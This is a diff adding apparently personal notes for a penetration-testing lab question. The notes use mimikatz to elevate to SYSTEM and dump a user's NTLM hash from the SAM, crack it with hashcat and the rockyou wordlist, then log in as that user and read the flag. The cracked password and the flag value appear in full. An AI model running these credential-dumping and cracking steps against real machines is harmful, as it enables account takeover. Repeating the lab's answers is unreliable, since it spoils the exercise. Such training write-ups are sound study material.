@@ -1,0 +1,46 @@
+Question 1
+Follow the steps outlined in this section and find the flag on the nelly user's desktop on VM #1 (MARKETINGWK01).
+
+xfreerdp /u:offsec /p:lab /v:192.168.190.210 /drive:smbfolder,/home/kali/Desktop
+
+# Open Powershell
+Get-Localuser
+Name               Enabled Description
+----               ------- -----------
+Administrator      False   Built-in account for administering the computer/domain
+DefaultAccount     False   A user account managed by the system.
+Guest              False   Built-in account for guest access to the computer/domain
+nelly              True
+offsec             True
+sam                True
+WDAGUtilityAccount False
+
+# Open Powershell with Administrator
+cd C:\tools\
+.\mimikatz.exe
+mimikatz # privilege::debug
+# elevate to SYSTEM user privileges
+mimikatz # token::elevate
+660     {0;000003e7} 1 D 41824          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !
+ * Process Token : {0;002ea510} 2 F 3837032     MARKETINGWK01\offsec    S-1-5-21-4264639230-2296035194-3358247000-1001  (14g,24p)       Primary
+ * Thread Token  : {0;000003e7} 1 D 4754372     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+#
+mimikatz # lsadump::sam
+RID  : 000003ea (1002)
+User : nelly
+  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
+
+nano nelly.hash # paste the Hash code into it
+hashcat -h | grep -i "NTLM"
+1000 | NTLM            | Operating System
+
+hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+
+3ae8e5f0ffabb3a627672e1600f1ba10:nicole1
+
+xfreerdp /u:nelly /p:nicole1 /v:192.168.190.210 /drive:smbfolder,/home/kali/Desktop
+
+open flag.txt
+OS{3d5c233926c15aa766ef764bcac8cf45}
